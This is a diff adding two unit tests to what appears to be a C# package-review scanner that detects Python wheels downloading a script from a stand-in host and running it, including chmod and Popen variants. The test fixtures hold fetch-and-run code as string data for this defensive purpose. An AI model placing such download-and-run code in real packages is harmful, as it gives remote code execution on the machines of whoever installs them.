@@ -1026,6 +1026,25 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void A_wheel_module_that_writes_a_download_and_runs_the_written_path_is_noteworthy()
+    {
+        var r = Review(Zip("tool-1.0-py3-none-any.whl", Wheel(("tool/__init__.py",
+            U("import subprocess, urllib.request\nP = '/tmp/t.py'\nd = urllib.request.urlopen('https://example.invalid/t').read()\nopen(P, 'wb').write(d)\nsubprocess.run(['python3', P])\n")))));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/download-and-run", Level: "noteworthy", Path: "tool/__init__.py" });
+    }
+
+    [Fact]
+    public void Download_and_run_needs_the_written_path_as_the_interpreter_or_chmod_argument()
+    {
+        const string Run = "subprocess.check_call(['python3', r'..\\setup.py', 'build'])\n";
+        var head = "import subprocess, urllib.request\nr = urllib.request.urlopen(url)\ndata = r.read()\nopen(name, 'wb').write(data)\n";
+        Assert.DoesNotContain(Details(head + Run), d => d == "downloads a program or script and runs it");
+        Assert.DoesNotContain(Details(head + "os.chmod(name, 0o644)\n"), d => d == "downloads a program or script and runs it");
+        Assert.Contains(Details(head + "os.chmod(name, 0o755)\n"), d => d == "downloads a program or script and runs it");
+        Assert.Contains(Details(head + "subprocess.Popen([sys.executable, name])\n"), d => d == "downloads a program or script and runs it");
+    }
+
+    [Fact]
     public void Import_time_code_with_a_webhook_escaped_eval_and_stealer_dependencies_is_noteworthy()
     {
         var r = Review(Tgz("hugebbc-0.0.0.tar.gz",
